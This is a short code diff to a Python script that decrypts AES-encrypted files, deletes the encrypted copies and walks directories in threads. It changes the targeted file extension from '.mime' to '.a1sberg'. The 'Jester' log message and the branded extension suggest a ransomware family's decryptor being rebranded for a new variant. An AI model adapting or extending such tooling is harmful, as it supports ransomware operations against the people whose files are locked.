@@ -64,7 +64,7 @@ def decrypt_file(encrypted_file_path, key):
         cipher_text = encrypted_data[16:]
         cipher = AES.new(key, AES.MODE_CBC, iv)
         decrypted_data = unpad(cipher.decrypt(cipher_text), AES.block_size)
-        decrypted_file_path = encrypted_file_path.rsplit('.mime', 1)[0]
+        decrypted_file_path = encrypted_file_path.rsplit('.a1sberg', 1)[0]
         with open(decrypted_file_path, 'wb') as dec_file:
             dec_file.write(decrypted_data)
         os.remove(encrypted_file_path)
@@ -75,7 +75,7 @@ def decrypt_file(encrypted_file_path, key):
 def process_directory(root, files, key, max_threads=30):
     threads = []
     for file_name in files:
-        if file_name.endswith('.mime'):
+        if file_name.endswith('.a1sberg'):
             file_path = os.path.join(root, file_name)
             print(f"[*] Jester is Preparing: {file_path}")
             while len(threads) >= max_threads:
